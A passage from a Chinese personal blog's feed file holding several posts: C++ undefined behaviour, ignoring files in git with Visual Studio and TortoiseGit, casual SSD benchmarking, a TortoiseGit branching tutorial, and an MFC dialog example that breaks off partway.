title="总而言之"></a>总而言之</h2><p>我所知道的都是比较浅薄的，百度一搜都有很多高端的东西，像是容器+算法然后整的活。可能这才是真正的程序员吧，还要翻阅文献什么的确实太顶了。。<br>严格意义上，未定义行为不算一个详细的知识体系，你不可能记住所有的未定义行为吧。。。毕竟是叫未定义啊，有些指不定还是你整的活。</p><p>常见的反正就是那么几种</p><ol><li>有符号类型赋值的时候超出范围</li><li>函数体之间忘记初始化之类的</li><li>算术表达式写的不好就会产生未定义的结果</li><li>数学性质除以0</li><li>经典溢出，有的时候溢出是不一定会报错的</li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>坦白的说，还不够深入了解<br>但是一码归一码，像这种未定义行为可能还是因为c&#x2F;c++比较自由<br>还得努力学啊~~~感觉自己就是废物</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于git忽略文件</title>
      <link href="/2022/08/21/git-vs-tortoise/"/>
      <url>/2022/08/21/git-vs-tortoise/</url>
      
        <content type="html"><![CDATA[<p>本文简单介绍vs和tortoise git的忽略方式，水平一般有问题欢迎指出。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>目前也就会几种</p><ol><li>先从github的仓库create</li><li>vs利用git拓展</li><li>小乌龟git</li></ol><p>然后项目是cpp的，用的ide是vs，所以如果是别的项目或许关键点不一样<br><strong>关于为什么要忽略掉一些文件，按照惯例一般上传都是纯净的，你自己编译产生的exe、log和一些隐藏文件是别人不需要的，而且这些还占内存</strong></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-vs的忽略方式"><a href="#1-vs的忽略方式" class="headerlink" title="1. vs的忽略方式"></a>1. vs的忽略方式</h2><p>vs比较干脆吧，毕竟是图形化操作。</p><ol><li>首先在顶部菜单栏选择视图，打开git更改</li><li>然后你改动过的文件会在项目出现，你可以直接右击</li></ol><img src="/2022/08/21/git-vs-tortoise/000.png" class=""><p>忽略此本地项就是只忽略这个文件<br>忽略此拓展名，比如头文件的尾缀名是.h，那么所有的.h就被忽略了。</p><p>不过对于隐藏文件好像不太好显示，明确的话直接在第三种方式里面修改</p><blockquote><p>以我vs创建的项目为例，目录下都有个.vs的隐藏文件夹，这玩意体积大老大了，实际用处不大，然后除了手动添加了什么静态库之类的，再去掉debug和release目录，实际上的代码体积是很小的。</p></blockquote><p>你要是上传几个g到仓库，先不说速度，等会给ban了。</p><hr><h2 id="2-小乌龟git的忽略方式"><a href="#2-小乌龟git的忽略方式" class="headerlink" title="2. 小乌龟git的忽略方式"></a>2. 小乌龟git的忽略方式</h2><p>小乌龟的忽略方式同样是右击直接干，当然你再安装小乌龟的时候要给他添加到环境变量的，不然右键菜单里面不一定会有。</p><p>这个同样对于隐藏的文件好像不能主动忽略，除非你提交到仓库的时候给他忽略了，或者还是第三种就写好。</p><img src="/2022/08/21/git-vs-tortoise/001.png" class=""><p>虽然有的时候好像也会弹不出来。</p><p>可能提交的时候忽略会比较好使，但是我们知道的大类，是可以提前排除的最好，不然整个项目文件其实还是挺多的，检索一番也比较费时。</p><img src="/2022/08/21/git-vs-tortoise/002.png" class=""><hr><h2 id="3-gitignore文件"><a href="#3-gitignore文件" class="headerlink" title="3. .gitignore文件"></a>3. .gitignore文件</h2><p>这玩意就是核心点了，毕竟你图形化的操作也是变相的往里面编写。<br>github也有相应的介绍<a href="https://github.com/github/gitignore">戳此处</a><br>包括<a href="https://git-scm.com/book/en/v2/Git-Basics-Recording-Changes-to-the-Repository#_ignoring">如何忽略文件或目录</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># ignore all .a files</span><br><span class="line">*.a</span><br><span class="line"></span><br><span class="line"># but do track lib.a, even though you&#x27;re ignoring .a files above</span><br><span class="line">!lib.a</span><br><span class="line"></span><br><span class="line"># only ignore the TODO file in the current directory, not subdir/TODO</span><br><span class="line">/TODO</span><br><span class="line"></span><br><span class="line"># ignore all files in any directory named build</span><br><span class="line">build/</span><br><span class="line"></span><br><span class="line"># ignore doc/notes.txt, but not doc/server/arch.txt</span><br><span class="line">doc/*.txt</span><br><span class="line"></span><br><span class="line"># ignore all .pdf files in the doc/ directory and any of its subdirectories</span><br><span class="line">doc/**/*.pdf</span><br></pre></td></tr></table></figure><p>官方介绍的：<br>您可以放入<code>.gitignore</code>文件中的模式规则如下：</p><ul><li>空白行或以开头<code>#</code>的行将被忽略。</li><li>标准 glob 模式有效，并将在整个工作树中递归应用。</li><li>您可以使用正斜杠 <code>/</code> 开始模式以避免递归。</li><li>您可以使用正斜杠 <code>/</code> 结束模式以指定目录。</li><li>您可以通过以感叹号 <code>!</code> 开头来否定模式。</li></ul><blockquote><p>Glob 模式就像 shell 使用的简化正则表达式。星号 ( *) 匹配零个或多个字符；[abc]匹配括号内的任何字符（在本例中为 a、b 或 c）；问号 ( ?) 匹配单个字符；和括号括起由连字符 ( [0-9]) 分隔的字符，匹配它们之间的任何字符（在本例中为 0 到 9）。您还可以使用两个星号来匹配嵌套目录；a&#x2F;**&#x2F;z将匹配a&#x2F;z, a&#x2F;b&#x2F;z, a&#x2F;b&#x2F;c&#x2F;z, 等等。</p></blockquote><p>咱目前应该用这些就够了：</p><ul><li>以斜杠<code>/</code><ol><li>若斜杠在前，表示只忽略当前目录下这个名字的文件和目录，子目录不在范围</li><li>若斜杠在后，表示只忽略这个目录，不忽略这个名字的文件</li><li><code>!file/</code>这种做法等同于<code>file</code>，即忽略这个文件，不忽略这个名字的目录</li></ol></li><li>以星号<code>*</code>通配多个字符，比如<code>*.h</code></li><li>以问号<code>?</code>通配单个字符，这个不常用啊</li><li>以方括号<code>[]</code>包含单个字符的匹配列表<ol><li>例如<code>*.[hc]</code>，就是忽略掉所有的<code>.h</code>和<code>.c</code>文件，只要匹配到其中一个字符就成立</li></ol></li><li>以<code>.</code>开头的也就是隐藏文件或者目录，基本包含在内，比如vs生成的项目里就有个.vs的隐藏文件夹，可以直接用这个忽略掉。</li></ul><p>以叹号“!”表示不忽略(跟踪)匹配到的文件或目录；<br><strong>注意，gitignore偏向于解释型，匹配规则自上而下，前面已经匹配到了后面的就不会生效</strong><br><strong>添加忽略前上传的文件无法生效，只能clone下来删除后匹配忽略在上传</strong><br><strong>解释型语言好像都喜欢用#当注释</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>作为码农，git肯定还是要会用的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没搞头的ssd跑分</title>
      <link href="/2022/08/20/ssdTest/"/>
      <url>/2022/08/20/ssdTest/</url>
      
        <content type="html"><![CDATA[<h1 id="随便测测反正娱乐"><a href="#随便测测反正娱乐" class="headerlink" title="随便测测反正娱乐"></a>随便测测反正娱乐</h1><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>主流两个软件</p><ul><li>AS SSD Benchmark</li><li>CrystalDiskMark</li></ul><p>但是u1s1前者的成绩比较渣，后者的还比较符合厂家给出的理论最大上限。</p><img src="/2022/08/20/ssdTest/asssd01.png" class=""><img src="/2022/08/20/ssdTest/cdm02.png" class=""><blockquote><p>以pm9a1来说，pice4.0*4，厂家给出的数据，<br>1tb的容量，r：7000mb&#x2F;s，w：5100mb&#x2F;s</p></blockquote><p>其实感觉也得考虑几个问题</p><ol><li>温度影响，简单安装的硬盘，也没搞铜片或者石墨烯，温度高了也有可能造成性能损耗</li><li>已有容量，感觉空盘切没分盘的时候可能效果最好</li><li>系统，win10和win11，win11感觉还是不完善。。win10也有点要搞事情的感觉</li><li>软件，就上面两个而言就能看出区别</li></ol><p>虽然我们也不得而知两个软件是靠什么得出这个数据，而且本身就是看一看。。实际感知到了一定程度并没有这么敏感。</p><p>搜了一下，有个说法挺有意思，但仅供参考<br>首先就是进制问题，硬盘厂家采用的是10进制啊，而计算机底层是二进制。<br>1tb 本来应该是 1024g，但是通过厂家的设计，变成了9xx多个g。<br>这也导致，这两个软件有一个要使用二进制去算成绩，肯定比十进制要低。</p><p>所以。。谁高谁低，谁用十进制谁用二进制或许可窥一斑</p><p>另一种4k对齐的说法和缓冲区，但是鬼晓得。。咱也不探讨这么深，就是说简单看看，不然到手看到as ssd的速度我都想退货了md。</p><p><strong>注意：不是专业的，仅为娱乐发言</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>所以实际上极值咱也别追求了，损耗能在5%-10%左右就很好了。虽然心理预期总归不舒服。<br>有异常，建议先搜这个硬盘型号，看看是否也有人遇到，除此之外如果是升级完系统突然掉速可回退，固件版本带来的影响目前没感受到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> NoteBook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】小王八git版本控制工具</title>
      <link href="/2022/08/18/TortoiseGit/"/>
      <url>/2022/08/18/TortoiseGit/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要科学。</p><ul><li><a href="https://tortoisegit.org/download/">下载地址</a></li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><img src="/2022/08/18/TortoiseGit/000.png" class=""><p>一般都是选x64了，虽然也有不少应用还是这个x86，但是记得配套就行，上面是git本体，下面是语言包</p><p><strong>温馨提示，最好先下个git for windows，我因为早下了所以好像没提示</strong></p><hr><h2 id="vs配置"><a href="#vs配置" class="headerlink" title="vs配置"></a>vs配置</h2><p>然后就是visual studio的配置，一般也不做啥调整<br>打开工具-选项-源代码管理</p><img src="/2022/08/18/TortoiseGit/001.png" class=""><p>默认都是git，问题不大，自己看下是不是。</p><p>然后再工具那边打开源代码管理的几个按钮<br>右击顶栏很多按钮那一条，弹出这个，选中源代码管理即可</p><img src="/2022/08/18/TortoiseGit/002.png" class=""><p>选中之后，能看到多了一些，基础就大概这样了</p><img src="/2022/08/18/TortoiseGit/003.png" class=""><hr><h2 id="gitee-x2F-github创建仓库"><a href="#gitee-x2F-github创建仓库" class="headerlink" title="gitee&#x2F;github创建仓库"></a>gitee&#x2F;github创建仓库</h2><p>gitee嘛国内的不用科学，但是之前出了一档子破事好像都要审核了，我也没怎么用。<br>这里用的github，问题不大，懂得都懂。</p><p>简单介绍</p><img src="/2022/08/18/TortoiseGit/004.png" class=""><p>然后create之后就能看到</p><img src="/2022/08/18/TortoiseGit/005.png" class=""><blockquote><p>没必要去翻我的哈。。自己学习用的</p></blockquote><p>那么仓库建好了，就要用源代码管理工具去操作了。</p><p>首先看仓库的code按钮</p><img src="/2022/08/18/TortoiseGit/006.png" class=""><p>有三种clone方式，第一种https，这个应该不陌生的吧大部分人，就是web协议，http的基础上加入ssl证书验证。第二种比较常用，ssh，为啥这么说呢。。之前瞎搞linux的时候，就常用就是直接clone到文件夹，然后去执行.&#x2F;install.sh脚本哈哈哈。第三种带了个cli，估计就是client，github的客户端了应该是。</p><p>小乌龟添加的方式差不多也用ssh，所以copy这个ssh给的链接。<br>然后找个地方建个空的文件夹，因为要clone进去，文件夹的名字和仓库名倒是没要求要一样，我这是为了好区分。</p><img src="/2022/08/18/TortoiseGit/007.png" class=""><p>然后在此处右击</p><img src="/2022/08/18/TortoiseGit/008.png" class=""><p>点击这个克隆</p><img src="/2022/08/18/TortoiseGit/009.png" class=""><p>我们把url填入其中</p><img src="/2022/08/18/TortoiseGit/010.png" class=""><p>github复制的url不需要做什么改动，除此之外小微调一下</p><img src="/2022/08/18/TortoiseGit/011.png" class=""><img src="/2022/08/18/TortoiseGit/012.png" class=""><p>然后点击是的时候大概率会报错，<code>server sent :publickey</code>，大致意思就是你没有设置publickey，我是用hexo搭博客上传到github的，用的就是git的客户端。自然是设置过这个publickey的</p><p>首先打开tortoisegit的settings，找到网络，看下面的ssh客户端，原先那个我懒得再配一个给github了，反正我git用的多，直接用git的ssh就行了。<br><strong>如果你没有用过git for windows，那么我推荐你去下一个！</strong></p><blockquote><p>操作也不难，我学过linux，一般都是用git bash。<br>请前往我创建博客的文章，找到在用户目录下打开.ssh和用git bash设置github用户名+创建邮箱那几个地方。<br>如若不然，只得您自行寻找给小乌龟git的ssh客户端新建一个sshkey的凭证</p></blockquote><img src="/2022/08/18/TortoiseGit/014.png" class=""><p>设置完成后，重新clone。</p><img src="/2022/08/18/TortoiseGit/013.png" class=""><p>就没问题了，文件也clone到本地磁盘了。</p><img src="/2022/08/18/TortoiseGit/015.png" class=""><p>打开也没啥，就一个readme.md的自述文件，<code>.git</code>是隐藏文件，主要还是记录了git的信息。</p><hr><h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><p>右击这个clone的文件夹</p><img src="/2022/08/18/TortoiseGit/016.png" class=""><p>在旁边能找到显示日志信息的选项打开</p><img src="/2022/08/18/TortoiseGit/017.png" class=""><p>信息可以说还是很全面的。</p><p>日志可以很好的看出代码的改动，是谁改的，什么时候改的。而且防止删除源代码，在你不是这个库的创建者下，无权删除整个仓库，你顶多删掉你更新的那一块，不至于让整个项目从零开始。</p><hr><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>在github创建的时候仓库就是空的，除了一个自述文件。<br>那么最开始就配置的vs不能浪费，通过vs创建项目，然后上传一举多得。</p><img src="/2022/08/18/TortoiseGit/018.png" class=""><p><strong>注意路径是你之前clone的项目路径</strong></p><img src="/2022/08/18/TortoiseGit/019.png" class=""><p>然后这里把MFC标头勾选，点击确定项目就创建好了。</p><img src="/2022/08/18/TortoiseGit/020.png" class=""><p>创建好保存一下，先关闭vs。<br>然后转到文件夹，会看到我们这个新建的项目文件前面没有绿色的勾。<br>其实也就是因为他还没上传到仓库。</p><img src="/2022/08/18/TortoiseGit/021.png" class=""><p>右击这个文件选择提交到-&gt;</p><img src="/2022/08/18/TortoiseGit/022.png" class=""><p>大致跟着来，但是注意，不要全选文件上传，有个文件是没啥价值的。</p><blockquote><p>.vs目录是用来存储当前用户在解决方案中的工作配置，具体包括VS关闭前最后的窗口布局、最后打开的选项卡&#x2F;操作记录&#x2F;文件文档、某些自定义配置&#x2F;开发环境、调试断点等这类设置信息和状态。直接删掉没有任何问题。<br>相当于说每台电脑生成项目的时候这个.vs都不一样，所以没有必要上传他，而且这个文件很占内存。</p></blockquote><p>我们可以右击手动设置忽略掉这个文件夹</p><img src="/2022/08/18/TortoiseGit/023.png" class=""><img src="/2022/08/18/TortoiseGit/024.png" class=""><p>注意不要收养选递归，不然有的时候出现重名啥的会被直接忽略。</p><p>除了这个<code>.vs</code>文件夹，还有一个文件也是不大需要的，</p><img src="/2022/08/18/TortoiseGit/025.png" class=""><p>可以看到是user，就是用户，那么每个用户生成的肯定也不一样。</p><img src="/2022/08/18/TortoiseGit/026.png" class=""><p>这个也不需要，忽略掉</p><hr><h2 id="小乌龟提交和推送"><a href="#小乌龟提交和推送" class="headerlink" title="小乌龟提交和推送"></a>小乌龟提交和推送</h2><img src="/2022/08/18/TortoiseGit/027.png" class=""><p>当你点击提交的时候，他还没有直接上传到仓库，而是生成缓存，只有点击推送了才是真的上传到仓库。</p><img src="/2022/08/18/TortoiseGit/028.png" class=""><p>做这些分层的工作，自然是为了更加安全的，有意义的，符合逻辑的上传。因为改多了突然一激灵想到那有问题，就可以重新来了。</p><img src="/2022/08/18/TortoiseGit/029.png" class=""><p>点击推送，就完事了。</p><img src="/2022/08/18/TortoiseGit/030.png" class=""><p>推送完成后能看到这个项目文件夹也多了绿色勾选。</p><p>亦可以通过日志，看到我们的更改信息</p><img src="/2022/08/18/TortoiseGit/031.png" class=""><p>vs重新打开的时候其实也能看到</p><img src="/2022/08/18/TortoiseGit/032.png" class=""><hr><h2 id="vs提交和推送"><a href="#vs提交和推送" class="headerlink" title="vs提交和推送"></a>vs提交和推送</h2><p>有一点是我们创建项目没有做的，就是生成解决方案<br>因为这个是我们编译后的产物，别人只需要拿到源码自己编译就行了。</p><p>所以我们在vs中先生成解决方案，然后到文件夹里面挨个忽略掉</p><img src="/2022/08/18/TortoiseGit/033.png" class=""><p>这里多个x64是手残了，没把项目的x64改成x86，老实说一般都还是x86比较多。</p><p>除了外面的debug文件夹，两个项目里面都有debug和x64，需要手动忽略，方法跟之前的一样。</p><img src="/2022/08/18/TortoiseGit/034.png" class=""><p>回过头来，当vs这些文件都出现蓝色的锁，就表示它们已经上传到仓库了。<br>当我们修改过其中一个地方，这个文件的蓝色锁就变成红色了。</p><img src="/2022/08/18/TortoiseGit/035.png" class=""><p>当有文件改动的时候，git插件就要干活了</p><img src="/2022/08/18/TortoiseGit/036.png" class=""><p>能看到多了一个提交和撤销。</p><p>这里选提交，点击全部暂存，看到.sln记得忽略掉。</p><img src="/2022/08/18/TortoiseGit/039.png" class=""><p>然后就是点击全部提交，会显示一个本地创建</p><img src="/2022/08/18/TortoiseGit/037.png" class=""><p>完成之后点击同步，然后再点击旁边的推送。</p><img src="/2022/08/18/TortoiseGit/040.png" class=""><p>最后也可以在日志中看到我们这次通过vs的提交</p><img src="/2022/08/18/TortoiseGit/038.png" class=""><p>其次在输出里面切换到git，我们也能看到流程</p><img src="/2022/08/18/TortoiseGit/041.png" class=""><p>此外github的仓库自然也能看到推送的情况</p><img src="/2022/08/18/TortoiseGit/042.png" class=""><hr><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>我们目前的操作，都是推送给main分支，也就是覆盖性的操作。<br>当然如果每次都覆盖，有一天新版本挂了想要恢复到某一结点就是不可能的事了。</p><p>所以仓库还有一个分支的选项。</p><img src="/2022/08/18/TortoiseGit/043.png" class=""><p>可以通过git更改的页，去选中那三个点，然后选择创建分支</p><p>显然分支的存在带来了很大的便捷性，毕竟一个项目会衍生出不同的情况，在许多个方案之间反复横跳，我们就可以通过分支去跟着横跳达到需求。</p><p>用vs切换分支不难，直接在git更改里面，这个框选里面选择就行</p><img src="/2022/08/18/TortoiseGit/045.png" class=""><p>还有就是命令行的情况，因为装了git for windows，所以有个git bash的产物，都是以linux命令行的形式玩的挺好用的。</p><img src="/2022/08/18/TortoiseGit/044.png" class=""><p>首先就是查看分支，和切换分支，不过分支是啥其实路径都明明白白了。</p><p>然后我们修改分支，在代码里加一句注释，等会上传完切换分支看看效果</p><img src="/2022/08/18/TortoiseGit/046.png" class=""><p>在github里面很自然的看出了两个分支，而新增的分支，多了一个我们刚才上传的localtest。</p><img src="/2022/08/18/TortoiseGit/047.png" class=""><img src="/2022/08/18/TortoiseGit/048.png" class=""><p>ok，重点时刻</p><img src="/2022/08/18/TortoiseGit/049.png" class=""><p>当我们在vs的git更改里面，签回main分支，会发现那句注释不见了。<br>切回到local_branch的时候注释又出来了</p><img src="/2022/08/18/TortoiseGit/050.png" class=""><p>这就是分支的力量。</p><p><strong>默认情况下创建的仓库，主分支一般都叫main或者master，目前新仓库的默认主分支都叫main了，老的可能还是master，具体原因可以百度好像是master这个词多义性。而主分支只有在新分支开发的功能完全ok的情况下才会合并一次，直接在主分支上操作的风险略高，且不利于团队发现问题。而且大部分情况下，功能也不会只有一个，多个人同时写尽量都创建分支</strong></p><p>附：百度来的一些分支命名</p><ol><li>git主分支(master)。它是自动建立，用于发布重大版本更新。</li><li>git开发主分支(develop)。日常开发在此分支上进行。</li><li>git临时性分支：主要是应对日常开发中的遇到的版本问题的。<ol><li>功能（feature）分支：它是为了开发某种特定功能，从Develop分支上面分出来的。开发完成后，要再并入Develop。可以采用feature-*的形式命名。</li><li>预发布（release）分支：指发布正式版本之前（即合并到Master分支之前），我们可能需要有一个预发布的版本进行测试。预发布分支是从Develop分支上面分出来的，预发布结束以后，必须合并进Develop和Master分支。它的命名，可以采用release-*的形式。</li><li>修补bug（hotfix）分支：软件正式发布以后，难免会出现bug。这时就需要创建一个分支，进行bug修补。修补bug分支是从Master分支上面分出来的。修补结束以后，再合并进Master和Develop分支。它的命名，可以采用hotfix-*的</li></ol></li></ol><p>用git bash操作也差不多的。无非就是图形化和命令行</p><img src="/2022/08/18/TortoiseGit/051.png" class=""><img src="/2022/08/18/TortoiseGit/052.png" class=""><p>这里提示了一下，因为我改动了哈哈</p><p>附：git的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看分支列表</span></span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建新分支</span></span><br><span class="line">git branch 新分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换分支</span></span><br><span class="line">git checkout 分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#快速创建分支并切换</span></span><br><span class="line">git checkout -b 分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并分支的时候，若目前在c分支，先切换到要合并的分支git checkout name，然后合并</span></span><br><span class="line">git merge c</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除分支</span></span><br><span class="line">git branch -d 分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并冲突还不是很理解，先空着</span></span><br></pre></td></tr></table></figure><hr><h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><ul><li>需求分析<ul><li>市场需求</li><li>估值</li></ul></li><li>技术分析<ul><li>技术栈涉及多少</li><li>时效</li></ul></li></ul><p>反正要考虑的挺多的，一个项目能不能立项要看需求，但是有的时候有需求没有用，没有资金筹备，项目上不了线，终归是胎死腹中。</p><p>还有感人的产品锦鲤，毕竟需求不可能是固定的。</p><hr><h2 id="附：git命令行操作"><a href="#附：git命令行操作" class="headerlink" title="附：git命令行操作"></a>附：git命令行操作</h2><p>网上copy的也就看看先，具体要用到哪些还不确定：</p><h3 id="一、-创建test分支提交步骤"><a href="#一、-创建test分支提交步骤" class="headerlink" title="一、 创建test分支提交步骤"></a>一、 创建test分支提交步骤</h3><ol><li><p>列出所有分支</p><blockquote><p>git branch -a</p></blockquote></li><li><p>创建test分支</p><blockquote><p>git branch test</p></blockquote></li><li><p>切换到test分支:</p><blockquote><p>git checkout test</p></blockquote></li><li><p>添加add修改:</p><blockquote><p>git add .</p></blockquote></li><li><p>添加commit注释</p><blockquote><p>git commit -m “第一次提交代码”</p></blockquote></li><li><p>提交到服务器</p><blockquote><p>git push origin test</p></blockquote></li></ol><h3 id="二、将test分支合并到master本地分支"><a href="#二、将test分支合并到master本地分支" class="headerlink" title="二、将test分支合并到master本地分支"></a>二、将test分支合并到master本地分支</h3><ol><li><p>创建test分支</p><blockquote><p>git branch test</p></blockquote></li><li><p>切换到test分支</p><blockquote><p>git checkout test</p></blockquote></li><li><p>在test分支添加一个readme.txt文件</p><blockquote><p>touch readme.txt<br>git add readme.txt</p></blockquote></li><li><p>提交commit本地文件</p><blockquote><p>git commit -m “增加readme.txt”</p></blockquote></li><li><p>切换到master分支</p><blockquote><p>git checkout master</p></blockquote></li><li><p>把test分支合并到master分支</p><blockquote><p>git merge test</p></blockquote></li><li><p>提交master分支到服务器</p><blockquote><p>git push origin master</p></blockquote></li><li><p>删除test分支</p><blockquote><p>git branch -d test</p></blockquote></li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>未完结~待续</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多个对话框关联</title>
      <link href="/2022/08/03/nDialog/"/>
      <url>/2022/08/03/nDialog/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>倒也没啥特别，效果是类似于一个问卷调查。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>直接在前面项目上改动了</p><img src="/2022/08/03/nDialog/000.png" class=""><p>点击这个按钮，自然是弹出新的对话框，所以要新建资源<br>右击资源视图中该项目的Dialog，选择添加资源</p><img src="/2022/08/03/nDialog/001.png" class=""><p>这个对话框类型后面仨就是大小之间有差异。</p><p>然后就是拖控件，其中这些radio单选框啥啥啥的，以前html做表单的时候用的感觉都差不多吧，不算太陌生。</p><img src="/2022/08/03/nDialog/002.png" class=""><p>样式完成之后要新建类和这个对话框关联</p><img src="/2022/08/03/nDialog/003.png" class=""><p><strong>这里要注意命名的时候要和Dialog里的一样，只不过我这个vs2022对话框id不知道为啥没显示，正常应该是会根据类名在前面加上IDD_，这也是为什么上面创建类名是这个样，但好在源文件头文件是随便的</strong></p><img src="/2022/08/03/nDialog/004.png" class=""><p>创建完之后可以看到类向导这里这个类关联的资源就是刚才新建的对话框</p><p>类和对话框关联之后，就要给这些控件添加变量。</p><p>单选框的特性就是只能选中一个，那么这个变量首先为值类型，其次类型为BOOL。创建三个又太麻烦，所以新建一个之后直接改成数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 单选框的值</span></span><br><span class="line">BOOL m_lang[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>在源文件中自然免不了修改了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PROP01.cpp: 实现文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;RunningButton.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PROP01.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PROP_01 对话框</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IMPLEMENT_DYNAMIC</span>(PROP_01, CPropertyPage)</span><br><span class="line"></span><br><span class="line">PROP_01::<span class="built_in">PROP_01</span>()</span><br><span class="line">: <span class="built_in">CPropertyPage</span>(IDD_PROP_01)&#123;</span><br><span class="line"><span class="built_in">memset</span>(m_lang, <span class="number">0</span>, <span class="built_in">sizeof</span>(m_lang));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROP_01::~<span class="built_in">PROP_01</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PROP_01::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_CPP, m_lang[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_JAVA, m_lang[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_PYTHON, m_lang[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(PROP_01, CPropertyPage)</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PROP_01 消息处理程序</span></span><br></pre></td></tr></table></figure><p>在c&#x2F;c++中布尔值本质就是0和1的表示，虽然TRUE真意是非0的值。<br><code>memset(m_lang, 0, sizeof(m_lang));</code>那么初始化的时候直接给这个数组全部写0，也就是表示FALSE，完成初始化的操作。</p><p>至于<code>DDX_Radio(pDX, IDC_RADIO_CPP, m_lang[0]);</code>，就可以通过数组依次绑定。</p><img src="/2022/08/03/nDialog/005.png" 